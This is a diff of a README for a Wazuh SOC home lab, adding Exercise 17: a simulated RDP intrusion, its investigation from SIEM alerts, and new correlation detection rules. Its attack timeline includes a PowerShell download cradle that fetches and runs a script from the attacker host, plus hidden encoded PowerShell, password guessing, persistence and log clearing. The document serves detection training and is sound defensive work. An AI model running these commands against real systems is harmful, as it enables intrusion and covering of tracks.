@@ -26,10 +26,10 @@
 A hands-on Security Operations Center (SOC) home lab built on VMware Workstation with a Wazuh SIEM, a Windows 11 endpoint running Sysmon, and a Kali Linux attacker. In each exercise I simulate a real attacker technique, investigate the resulting logs, close detection gaps with custom Wazuh rules mapped to MITRE ATT&CK, tune false positives, and document the evidence.
 
 > **At a glance**
-> - **16 exercises**, from brute-force detection to defense evasion, crash root-cause analysis, automated response, Linux privilege escalation and PowerShell attack detection
-> - **20 custom detection rules** (levels 6 to 14), **1 response-visibility rule** and **2 false-positive suppression rules**
-> - **MITRE ATT&CK coverage:** T1136.001, T1033, T1547.001, T1053.005, T1021, T1021.001, T1105, T1110.001, T1078, T1565.001, T1070.001, T1548.003, T1003.008, T1059.001, T1027.010, T1140, T1562.002
-> - **Skills:** Windows Event Log and Sysmon analysis, Linux auth log analysis, detection engineering, false-positive tuning, file integrity monitoring, defense-evasion detection, attack timelines, log-pipeline troubleshooting, crash dump analysis (WinDbg), automated response (Wazuh Active Response), Linux auditd, PowerShell Script Block Logging, auditing built-in detection rules
+> - **17 exercises**, from brute-force detection to defense evasion, crash root-cause analysis, automated response, Linux privilege escalation, PowerShell attack detection and a full incident investigation with a written report
+> - **22 custom detection rules** (levels 6 to 15, including an incident correlation rule), **1 response-visibility rule** and **2 false-positive suppression rules**
+> - **MITRE ATT&CK coverage:** T1136.001, T1033, T1547.001, T1053.005, T1021, T1021.001, T1105, T1110.001, T1078, T1565.001, T1070.001, T1548.003, T1003.008, T1059.001, T1027.010, T1140, T1562.002, T1098
+> - **Skills:** Windows Event Log and Sysmon analysis, Linux auth log analysis, detection engineering, false-positive tuning, file integrity monitoring, defense-evasion detection, attack timelines, log-pipeline troubleshooting, crash dump analysis (WinDbg), automated response (Wazuh Active Response), Linux auditd, PowerShell Script Block Logging, auditing built-in detection rules, incident investigation and reporting
 
 ## 📚 Documentation
 
@@ -40,6 +40,7 @@ A hands-on Security Operations Center (SOC) home lab built on VMware Workstation
 | 🎓 [Lessons learned](docs/03-lessons-learned.md) | What broke, what misled me, and what I do differently now |
 | 🧾 [Playbooks](playbooks/) | Investigation checklists for the alerts this lab produces |
 | ⚙️ [Rules](rules/) | The deployable `local_rules.xml` running on the Wazuh manager |
+| 📄 [Incident report IR-01](docs/incident-report-01.md) | Full intrusion (Exercise 17): timeline, IOCs, root cause, detection coverage, response, recommendations |
 | 🛡️ [Config](config/) | Active Response, auditd and PowerShell log collection configuration |
 | 📈 [TryHackMe progress](docs/tryhackme-progress.md) | Rooms completed and how they connect to the lab |
 
@@ -54,6 +55,8 @@ SOC-Home-Lab/
 │   ├── 01-architecture.md
 │   ├── 02-detection-rules.md
 │   ├── 03-lessons-learned.md
+│   ├── incident-report-01.md  Exercise 17 incident report
+│   ├── evidence/             Alert timeline behind the report
 │   └── tryhackme-progress.md
 ├── rules/
 │   └── local_rules.xml       Custom Wazuh rules (deployable)
@@ -62,9 +65,9 @@ SOC-Home-Lab/
 │   ├── auditd-wazuh-lab.rules  Linux audit rules (Exercise 15)
 │   ├── auditd-localfile.xml   audit.log input for Wazuh
 │   └── powershell-localfile.xml  PowerShell 4104 input for the agent (Exercise 16)
-├── playbooks/                PB-01 … PB-07 investigation checklists
+├── playbooks/                PB-01 … PB-08 investigation checklists
 └── screenshots/
-    └── Exercise-01 … Exercise-16
+    └── Exercise-01 … Exercise-17
 ```
 
 </details>
@@ -90,6 +93,7 @@ SOC-Home-Lab/
 - [Exercise 14: Automated Response with Wazuh Active Response](#exercise-14-automated-response-with-wazuh-active-response)
 - [Exercise 15: Linux Privilege Escalation Visibility with auditd](#exercise-15-linux-privilege-escalation-visibility-with-auditd)
 - [Exercise 16: PowerShell Attacks – Script Block Logging and Encoded Commands](#exercise-16-powershell-attacks--script-block-logging-and-encoded-commands)
+- [Exercise 17: Full Attack Chain Investigation and Incident Report](#exercise-17-full-attack-chain-investigation-and-incident-report)
 - [What I learned](#-what-i-learned)
 - [Next steps](#-next-steps)
 
@@ -121,7 +125,7 @@ Isolated NAT network 10.10.10.0/24. Dashboard: `https://10.10.10.10`. Full detai
 |---|---|---|---|---|
 | 100100 | 4 | New Windows user created | T1136.001 Local Account | 12 |
 | 100200 | 5 | `whoami` executed | T1033 System Owner/User Discovery | 10 |
-| 100300 | 6 | Registry Run key modified | T1547.001 Run Keys / Startup Folder | 12 |
+| 100300 | 6, 17 | Registry Run / RunOnce key modified by any process (fixed in Exercise 17) | T1547.001 Run Keys / Startup Folder | 12 |
 | 100400 | 6 | Scheduled task created | T1053.005 Scheduled Task | 12 |
 | 100500 | 8 | Network logon (type 3) | T1021 Remote Services | 12 |
 | 100600 | 8 | PowerShell web download | T1105 Ingress Tool Transfer | 12 |
@@ -133,6 +137,7 @@ Isolated NAT network 10.10.10.0/24. Dashboard: `https://10.10.10.10`. Full detai
 | 100930 | 11 | Windows event log cleared | T1070.001 Clear Windows Event Logs | 12 |
 | 101000 | 13 | RDP remote interactive logon (type 10) | T1021.001 Remote Desktop Protocol | 6 |
 | 101010 | 13 | RDP brute force that succeeded | T1110.001, T1021.001, T1078 | 14 |
+| 101020 | 17 | RDP login after failed logons from the same IP (below the 8-failure threshold) | T1110.001, T1021.001, T1078 | 12 |
 | 101100 | 14 | Attacker IP auto-blocked by Active Response (raises built-in 651) | n/a (response) | 8 |
 | 101200 | 15 | sudo run by a non-admin login user (auditd) | T1548.003 Sudo and Sudo Caching | 10 |
 | 101210 | 15 | /etc/shadow read attempt by a login user (auditd) | T1003.008 /etc/passwd and /etc/shadow | 12 |
@@ -142,6 +147,7 @@ Isolated NAT network 10.10.10.0/24. Dashboard: `https://10.10.10.10`. Full detai
 | 101315 | 16 | Full-spelling `Invoke-Expression` in a script block (built-in 91837 has a typo) | T1059.001 PowerShell | 8 |
 | 101320 | 16 | Run-time decoding or code rebuilding (FromBase64String, `[char[]]`, `-bxor`, string concatenation) | T1027.010, T1140 Deobfuscate/Decode | 10 |
 | 101330 | 16 | PowerShell Script Block Logging disabled or removed | T1562.002 Disable Windows Event Logging | 12 |
+| 101400 | 17 | **Incident:** persistence within 1 hour of a successful RDP password-guessing login | T1110.001, T1547.001, T1053.005, T1136.001 | 15 |
 
 Full rule details, MITRE coverage and documented visibility gaps: [docs/02-detection-rules.md](docs/02-detection-rules.md). Deployable rule file: [rules/local_rules.xml](rules/local_rules.xml). Investigation steps for these alerts: [playbooks/](playbooks/).
 
@@ -1655,6 +1661,183 @@ On the test day the endpoint wrote **243** Event 4104 records; only **22** becam
 
 ---
 
+## Exercise 17: Full Attack Chain Investigation and Incident Report
+
+**Goal:** stop testing one technique at a time. One attacker ran a complete intrusion, from password guessing to log clearing, and I investigated it as a SOC analyst from the SIEM alone, measured what was detected, closed the gaps and wrote an incident report.
+
+**MITRE:** T1046 · T1110.001 · T1021.001 · T1078 · T1033 · T1087.001 · T1059.001 · T1027.010 · T1105 · T1547.001 · T1053.005 · T1136.001 · T1098 · T1562.002 · T1070.001
+**Hosts:** SOC-Kali (10.10.10.130, attacker) · SOC-Win11 (victim) · SOC-Wazuh (10.10.10.10)
+**Report:** 📄 [**Incident Report IR-01**](docs/incident-report-01.md)
+
+### 1. The attack (14 minutes)
+
+A helpdesk account (`rdptest`) had a guessable password, local administrator rights and RDP access. All payloads were harmless.
+
+| Local time | Step |
+|---|---|
+| 09:45 | `nmap` finds RDP (3389) open |
+| 09:47 | `nxc rdp` guesses the password in 4 attempts (`Pwn3d!`), `xfreerdp3` opens a desktop |
+| 09:51 | Discovery: `whoami`, `net user`, `net localgroup Administrators`, `ipconfig`, `systeminfo` |
+| 09:52 | Hidden encoded PowerShell (`-nop -w hidden -enc`) |
+| 09:56 | `IEX ... DownloadString('http://10.10.10.130:8000/stage2.ps1')` |
+| 09:57 | Persistence: Run key, scheduled task, backdoor admin `svc-update` |
+| 09:58 | Script Block Logging turned off, Security log cleared, logoff |
+
+### 2. Investigation: what the SIEM showed
+
+In the 20-minute window Wazuh raised **105 alerts of level 5+**; **71 (68%) were noise** (Windows Update DLL alerts, Edge, Windows Search). Grouping by rule turned them into 24 lines and the attack story became readable.
+
+| Result | Steps |
+|---|---|
+| ✅ Level 10+ (9 of 15) | whoami, encoded PowerShell, download cradle, Run key, task, backdoor user, Administrators change, logging off, log cleared |
+| ⚠️ Only level 5–6 (2) | **the password guessing and the RDP login: the attacker's way in** |
+| ❌ Not detected (4) | port scan, `net user`, `ipconfig` / `systeminfo`, the dropped file |
+
+**Findings**
+
+- **Low-and-slow brute force was invisible.** Built-in 60204 needs `MS_FREQ` = 8 failures in 240 s. Four guesses stayed below it, so my Exercise 13 rule 101010 (built on 60204) never fired. The successful logon (92652) arrived **in the same second** as the failures, but only at level 6.
+- **A rule that only knew one tool.** My Exercise 6 rule 100300 was a child of 92302, which only matches `reg.exe`. The attacker used PowerShell: Sysmon logged the Run key (Event 13, `T1060,RunKey`) but no custom alert fired. It was caught only by 91844, a PowerShell 4104 rule, so one layer was hiding the gap in another.
+- **The only level 15 alerts were a false positive:** `msedge.exe` unpacking a DLL into the new profile's Temp folder (this also explained an unknown 92213 alert from Exercise 8).
+- **Local evidence was destroyed twice.** The attacker cleared the Security log; then File System auditing refilled the 20 MB log with 25,668 events in ~18 minutes and overwrote even the "log cleared" event. **Wazuh still had every 4625, 4624, 4720 and 4732.**
+- **Clock skew:** the endpoint was ~37 s ahead of the manager and Kali, so the timeline uses manager time.
+
+### 3. Closing the gaps
+
+```xml
+<!-- 100300 fixed: any process, Run / RunOnce only (not RunNotification) -->
+<rule id="100300" level="12">
+<if_sid>92300, 92302</if_sid>
+<field name="win.eventdata.targetObject" type="pcre2">(?i)CurrentVersion\\+Run(Once)?\\+</field>
+<description>Custom SOC rule: Run key modified - possible persistence</description>
+<mitre>
+<id>T1547.001</id>
+</mitre>
+</rule>
+
+<!-- Exercise 17: RDP login after a few failed logons + incident correlation -->
+<group name="local,windows,authentication,">
+
+  <rule id="101020" level="12" timeframe="300">
+    <if_sid>101000</if_sid>
+    <if_matched_sid>60122</if_matched_sid>
+    <same_field>win.eventdata.ipAddress</same_field>
+    <description>RDP logon by $(win.eventdata.targetUserName) from $(win.eventdata.ipAddress) after failed logons from the same IP (below the 8-failure threshold of 60204)</description>
+    <mitre><id>T1110.001</id><id>T1021.001</id><id>T1078</id></mitre>
+    <group>authentication_success,rdp_bruteforce_success,</group>
+  </rule>
+
+</group>
+
+<group name="local,windows,correlation,">
+
+  <rule id="101400" level="15" timeframe="3600">
+    <if_sid>100100, 100300, 100400, 91844</if_sid>
+    <if_matched_group>rdp_bruteforce_success</if_matched_group>
+    <description>Incident: persistence created within 1 hour of a successful RDP password-guessing login on $(win.system.computer)</description>
+    <mitre><id>T1110.001</id><id>T1547.001</id><id>T1053.005</id><id>T1136.001</id></mitre>
+  </rule>
+
+</group>
+```
+
+Rule 101010 was also tagged `rdp_bruteforce_success`, so 101400 correlates with either brute-force rule.
+
+**Design notes**
+- **101020** catches "failure followed by success" instead of counting failures, so it is not blind below a threshold. In a real network it would need an allow-list for users who simply mistype once.
+- **100300's** regex now requires a backslash after `Run` / `RunOnce`: the parent rule 92300 also matches `RunNotification`, which `sihost.exe` writes at every logon.
+- **101400** turns several level 12 alerts into one level 15 incident. With many endpoints it would also need a same-host condition.
+
+### 4. Result
+
+| Test | Result |
+|---|---|
+| Negative: `socadmin` creates a Run key with PowerShell, no brute force | **100300** (L12) fired (fix works); **no** 101400 |
+| Re-attack: 4 guesses + RDP login | **101020** (L12) ×2 |
+| Re-attack: Run key in the RDP session | **101400** (L15) ×2 "Incident: persistence created within 1 hour of a successful RDP password-guessing login" |
+
+The same four-guess intrusion that first produced level 5–6 alerts for its entry point now produces a level 12 login alert and a level 15 incident. Containment, eradication and the full timeline are in the [incident report](docs/incident-report-01.md).
+
+### Screenshots
+
+<table>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-12.png" width="100%"><br><sub>First look: 16 high alerts, no brute-force alert</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-13.png" width="100%"><br><sub>105 alerts grouped by rule: the attack story</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-14a.png" width="100%"><br><sub>4 failures (L5) and the RDP login (L6): no 60204 / 101010</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-14c.png" width="100%"><br><sub>Why: 60204 needs MS_FREQ = 8 failures in 240 s</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-16a.png" width="100%"><br><sub>Endpoint: Security log full (20 MB), oldest event 10:09</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-16b.png" width="100%"><br><sub>SIEM: every logon and account change still there</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-15.png" width="100%"><br><sub>MITRE view of the intrusion</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-20.png" width="100%"><br><sub>After the fix: 101020 (L12) and incident 101400 (L15)</sub></td>
+</tr>
+</table>
+
+<details>
+<summary>More screenshots</summary>
+
+<table>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-00.png" width="100%"><br><sub>Health check: services, logging, audit policy, lockout 10</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-01.png" width="100%"><br><sub>Rules backup, Exercise 14 responses still disabled</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-02.png" width="100%"><br><sub>Root cause: weak helpdesk account with admin rights and RDP</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-03.png" width="100%"><br><sub>Attacker preparation on Kali</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-04.png" width="100%"><br><sub>Port scan: 135, 445, 3389 open</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-05.png" width="100%"><br><sub>Password guessed in 4 attempts (Pwn3d!)</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-06.png" width="100%"><br><sub>RDP desktop as rdptest, elevated PowerShell</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-07.png" width="100%"><br><sub>Discovery commands</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-08.png" width="100%"><br><sub>Download cradle runs stage2.ps1</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-09.png" width="100%"><br><sub>Kali web server: GET /stage2.ps1</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-10.png" width="100%"><br><sub>Persistence: Run key, task, backdoor admin</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-11.png" width="100%"><br><sub>Logging off and Security log cleared</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-14d.png" width="100%"><br><sub>Level 15 92213 = Edge unpacker DLL (false positive)</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-14e.png" width="100%"><br><sub>No Sysmon 13 alert at the time of the Run key</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-14f.png" width="100%"><br><sub>But Sysmon did log it (Event 13, T1060,RunKey)</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-14g.png" width="100%"><br><sub>92302 matches reg.exe only; 91844 is a 4104 rule</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-14h.png" width="100%"><br><sub>92300: the Sysmon 13 Run key base rule (any process)</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-18.png" width="100%"><br><sub>Rules patched and validated</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-19.png" width="100%"><br><sub>Negative test: 100300 fires, no incident</sub></td>
+<td><img src="screenshots/Exercise-17/EX17-21.png" width="100%"><br><sub>Containment: accounts disabled, RDP off</sub></td>
+</tr>
+<tr>
+<td><img src="screenshots/Exercise-17/EX17-22.png" width="100%"><br><sub>Eradication verified, logging restored</sub></td>
+<td></td>
+</tr>
+</table>
+
+</details>
+
+### Key takeaways
+- A frequency threshold is a promise to ignore anything below it. "Failure followed by success" catches the patient attacker.
+- Test every rule with more than one tool: one detection layer can silently hide a gap in another.
+- The highest severity alert was a false positive; the attacker's entry was level 5–6. Severity is not priority.
+- Local logs disappear: cleared by the attacker, then overwritten by normal activity. The SIEM copy is the evidence.
+
+---
+
 ## 🎓 What I learned
 
 - **Triage:** reading rule ID, level, source IP and MITRE mapping; deciding true vs false positive from the exact field values
@@ -1670,6 +1853,8 @@ On the test day the endpoint wrote **243** Event 4104 records; only **22** becam
 - **Automated response:** Wazuh Active Response contains an attacker in seconds, but containment is not prevention, and a response can fail silently when the field it needs (`srcip`) is missing
 - **PowerShell visibility:** Script Block Logging (Event 4104) shows the decoded code behind `-EncodedCommand`, download cradles and run-time obfuscation; detections should read the script block, not only the command line
 - **Auditing the vendor ruleset:** testing every variant against built-in rules found a missing `enc` spelling (92057), a typo (91837) and an unanchored regex causing a level 14 false positive (91823)
+- **Incident investigation:** rebuilding an intrusion from SIEM alerts alone, separating 68% noise from the attack, pivoting on IP and account, proving the SIEM kept what the attacker deleted, and writing a full incident report
+- **Correlation:** a level 15 incident rule built from separate alerts, and a "failure then success" rule that catches password guessing below a frequency threshold
 - **Root-cause analysis:** testing the obvious suspect before acting on it, then using the event log timeline and a WinDbg crash dump to trace a `0x124` to a storage-driver timeout instead of guessing
 
 The detailed version, with what happened and what I changed in each case, is in [docs/03-lessons-learned.md](docs/03-lessons-learned.md).
@@ -1681,6 +1866,8 @@ The detailed version, with what happened and what I changed in each case, is in 
 - Tune rule 92219 noise caused by Windows Update (`C:\Windows\SoftwareDistribution`)
 - Custom Windows active-response script that reads `win.eventdata.ipAddress`, so RDP brute force can be blocked too
 - Confirm the journald-rotation event loss with archives enabled during a burst
+- Discovery-burst rule (`net`, `whoami`, `ipconfig`, `systeminfo` from one user within minutes) and NTP time sync on the endpoint
+- Tune the Exercise 17 noise: 92217 (executables in the Windows folder) and 92213 for the Edge unpacker
 - Tune PowerShell 4104 noise: the Wazuh agent's own SCA scan (91816), the 91823 false positive and Windows maintenance scripts (91820)
 - Add the Script Block Logging registry key to the Sysmon config (Event 13) and collect PowerShell 7 (`PowerShell Core/Operational`) logs
 - Next exercises: more detection scenarios, then a web penetration testing lab and a network security lab
